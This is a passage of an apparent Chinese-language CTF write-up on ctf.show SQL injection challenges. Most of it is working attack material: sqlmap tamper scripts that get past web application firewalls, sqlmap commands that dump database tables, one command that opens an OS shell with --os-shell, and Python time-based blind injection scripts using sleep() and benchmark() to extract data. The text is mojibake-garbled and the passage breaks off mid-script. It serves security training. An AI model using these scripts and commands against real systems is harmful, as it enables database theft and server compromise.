punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character (' ') with comments '/**/'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'SELECT/**/id/**/FROM/**/users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x2A</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                <span class="token comment"># retVal += "/**/"</span>                retVal <span class="token operator">+=</span> char<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><h4 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†</span>  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      </code></pre><p>å¯¹ä¼ å…¥çš„id è¿›è¡Œè§£å¯†å¤„ç† ä»è€Œè®©sqlè¯­å¥æ— æ³•æ‰§è¡ŒæˆåŠŸ </p><p>æŒ‰ç…§ä»–çš„æ–¹å¼ åç€æ„é€ ä¸€ä¸ªåŠ å¯†è„šæœ¬ è¿™æ ·ä¼ è¿›å»å æœåŠ¡å™¨å¯¹idè¿›è¡Œä¸€ç³»åˆ—æ“ä½œå°±å˜æˆäº† æˆ‘ä»¬æƒ³åˆ°çš„idçš„å€¼äº†</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;30e6ea25-0680-4bf6-af39-8be519b7bd22.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;9j6o3g1dvnmvg061n1kbjlruvp&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch</code></pre><p><strong>web210.py</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Author:Y4tacker"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    retVal <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal</code></pre><h4 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h4><p>è¿‡æ»¤äº† åœ¨web210çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†ç©ºæ ¼ å°†ç©ºæ ¼æ›¿æ¢æˆ%0aï¼Œä½†æ˜¯ä¹‹å‰è„šæœ¬ä¾æ—§å¯ä»¥</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;f2caf00e-910a-4b69-9561-e6da6b0fb648.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;vueov0jlmgnnbpnr8bgovga6r8&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre><h4 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h4><p>å¤šè¿‡æ»¤äº†<code>*</code>ï¼ŒPayloadåŒä¸Š</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --user-agent&#x3D;sqlmap --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;c9220216-1978-4f6d-afa6-3fbba4ac7dfb.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --cookie&#x3D;&quot;PHPSESSID&#x3D;4ob2ad7so7hia0pjdds9df53rj&quot; --tamper web210.py -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch</code></pre><h4 id="web213-â€“os-shell"><a href="#web213-â€“os-shell" class="headerlink" title="web213(â€“os-shell)"></a>web213(â€“os-shell)</h4><p>ä½¿ç”¨åˆšæ‰çš„tamperè„šæœ¬å°±è¡Œï¼Œä½†æ˜¯æœ€åä½¿ç”¨<code>--os-shell</code>è¿›å…¥shelläº¤äº’å°±è¡Œ</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">python sqlmap.py -u &quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;mqte5lhv097hu0km2aq9c4qqri&quot; --safe-url&#x3D;&quot;https:&#x2F;&#x2F;a3fc1f89-804d-42f5-a05a-16a174522da2.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;web210.py --os-shell</code></pre><h4 id="web214-æ—¶é—´ç›²æ³¨"><a href="#web214-æ—¶é—´ç›²æ³¨" class="headerlink" title="web214(æ—¶é—´ç›²æ³¨)"></a>web214(æ—¶é—´ç›²æ³¨)</h4><p>åˆ·æ–°é¦–é¡µæŠ“åŒ…å¾—åˆ°æ³¨å…¥ç‚¹(æˆ‘ç”¨httpsçš„æ—¶å€™æ²¡æŠ“åˆ°ï¼Œhttpå°±å¯ä»¥äº†)</p><p><img src="web214.png" loading="lazy"></p><p>ç„¶åå°±æ˜¯è¿›è¡Œæ—¶é—´ç›²æ³¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://8b0ff336-3094-4316-b708-b0d88f596b52.challenge.ctf.show/api/"</span>i <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagx,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flaga,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flaga from ctfshow_flagx"</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)"</span></span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'0'</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h4><p>ä½¿ç”¨å•å¼•å·é—­åˆï¼Œåé¢ä½¿ç”¨<code>#</code>æˆ–è€…é—­åˆ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://1959b6f7-1317-4f83-a586-f487063f8d90.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagxc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaa,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaa from ctfshow_flagxc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1' or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1) and '1'='1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web216-to-base64"><a href="#web216-to-base64" class="headerlink" title="web216(to_base64)"></a>web216(to_base64)</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select id from ctfshow_info where ip &#x3D; from_base64(127.0.0.1);</code></pre><p>å°†Payloadè¿›è¡Œbase64ç¼–ç å¹¶é—­åˆå³å¯</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://7d8b8dba-70c3-4c4e-8065-f936f72d0187.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagxcc,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaac,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaac from ctfshow_flagxcc"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"'MQ==') or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(1),1)#"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><h4 id="web217-benchmark"><a href="#web217-benchmark" class="headerlink" title="web217(benchmark)"></a>web217(benchmark)</h4><p><code>sleep</code>è¢«banäº†</p><p><a href="https://www.cnblogs.com/c1e4r/articles/9060525.html">sqlæ—¶é—´ç›²æ³¨å¦å¤–ä¸¤ç§æ–¹å¼(benchmark,heavy query)</a></p><p><strong>benchmark()</strong></p><p>benchmarkæ˜¯Mysqlçš„ä¸€ä¸ªå†…ç½®å‡½æ•°,å…¶ä½œç”¨æ˜¯æ¥æµ‹è¯•ä¸€äº›å‡½æ•°çš„æ‰§è¡Œé€Ÿåº¦ã€‚benchmark()ä¸­å¸¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œçš„æ¬¡æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯è¦æ‰§è¡Œçš„å‡½æ•°æˆ–è€…æ˜¯è¡¨è¾¾å¼</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; select BENCHMARK(10000,md5(&#39;a&#39;));+---------------------------+| BENCHMARK(10000,md5(&#39;a&#39;)) |+---------------------------+|                         0 |+---------------------------+1 row in set (0.00 sec)mysql&gt; select BENCHMARK(1000000,md5(&#39;a&#39;));+-----------------------------+| BENCHMARK(1000000,md5(&#39;a&#39;)) |+-----------------------------+|                           0 |+-----------------------------+1 row in set (0.33 sec)mysql&gt; select BENCHMARK(10000000,md5(&#39;a&#39;));+------------------------------+| BENCHMARK(10000000,md5(&#39;a&#39;)) |+------------------------------+|                            0 |+------------------------------+1 row in set (2.93 sec)</code></pre><p>å¯ä»¥çœ‹åˆ°,æ‰§è¡Œä¸åŒçš„æ¬¡æ•°é‚£ä¹ˆæ‰§è¡Œçš„æ—¶é—´ä¹Ÿå°±ä¸ä¸€æ ·ï¼Œé€šè¿‡è¿™ä¸ªå‡½æ•°æˆ‘ä»¬å¯ä»¥è¾¾åˆ°ä¸sleep()åŒæ ·çš„å»¶æ—¶ç›®çš„ã€‚</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">ip&#x3D;1) and if(2&gt;1,(select count(*) from((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,2)c)),1&amp;debug&#x3D;1</code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://92f2c52d-9e13-4d63-8711-5eea7dcd5ac4.challenge.ctf.show/api/"</span>flag <span class="token operator">=</span> <span class="token string">''</span>i <span class="token operator">=</span> <span class="token number">30</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># æŸ¥åº“å</span>        <span class="token comment"># payload = "select group_concat(table_schema) from information_schema.schemata"</span>        <span class="token comment"># æŸ¥è¡¨å  ctfshow_flagxccb,ctfshow_info</span>        <span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment"># æŸ¥åˆ—å  id,flagaabc,info</span>        <span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flagxccb"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"ip"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1) or if(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">,benchmark(700000,md5(1)),1"</span></span><span class="token punctuation">,</span>            <span class="token string">"debug"</span><span class="token punctuation">:</span> <span class="token string">"1"</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token 